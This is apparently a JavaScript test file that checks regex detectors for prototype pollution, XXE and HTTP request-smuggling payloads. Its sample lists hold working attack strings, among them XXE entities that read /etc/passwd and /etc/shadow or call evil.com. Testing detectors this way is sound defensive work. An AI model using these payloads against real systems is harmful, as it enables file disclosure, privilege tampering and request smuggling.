const assert = require('assert');

function test() {
    const protoPayloads = ['__proto__[admin]=true', 'constructor.prototype.isAdmin=true', '{"__proto__":{"polluted":true}}', 'Object.prototype.toString=function(){}'];
    const protoDetect = (d) => /__proto__\s*[\[.":]|constructor\s*\.prototype\s*[\[.]|Object\s*\.\s*prototype\s*[\[.]/i.test(d);
    for (const p of protoPayloads) if(!protoDetect(p)) console.log('PROTO FAIL:', p);

    const xxePayloads = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">'];
    const xxeDetect = (d) => /<\!(?:DOCTYPE|ENTITY)\s+[^>]*(?:SYSTEM|PUBLIC)\s+['"][^'"]+['"]/i.test(d);
    for (const p of xxePayloads) if(!xxeDetect(p)) console.log('XXE FAIL:', p);

    const httpPayloads = ['Transfer-Encoding: chunked\r\nContent-Length: 0', 'GET / HTTP/1.1\r\nHost: internal\r\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked'];
    const httpDetect = (d) => /transfer-encoding\s*:.*?(?:chunked|identity)[\s\S]*?content-length\s*:|content-length\s*:\s*\d+[\s\S]*?transfer-encoding\s*:|transfer-encoding\s*:\s*chunked/i.test(d);
    for (const p of httpPayloads) if(!httpDetect(p)) console.log('HTTP FAIL:', p);
}
test();
